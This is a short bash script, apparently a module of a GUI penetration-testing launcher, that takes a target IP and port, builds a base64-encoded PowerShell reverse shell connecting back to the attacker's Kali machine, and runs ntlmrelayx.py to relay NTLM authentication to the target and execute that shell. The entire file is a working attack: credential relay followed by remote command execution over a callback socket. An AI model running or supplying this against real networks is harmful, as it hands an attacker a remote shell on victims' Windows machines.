#!/bin/bash

: '
ntlmrelayx: NTLM relayx attack, execute cmd
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
TARGET_IP_FIELD=$(form_item "target ip" "target_ip")
PORT_FIELD=$(form_item  "port" "number" "port" "1337")

# Generate GUI form
generate_form "${TARGET_IP_FIELD}" "${PORT_FIELD}"

TARGET_IP=${form_data["target_ip"]}
PORT=${form_data["port"]}

REV_SHELL=$(echo "\$client = New-Object System.Net.Sockets.TCPClient(\"${KALI_IP}\",${PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" | iconv -t UTF-16LE | base64 -w 0)

execute_command "ntlmrelayx.py --no-http-server -smb2support -t ${TARGET_IP} -c 'powershell -e ${REV_SHELL}'"
create_new_line
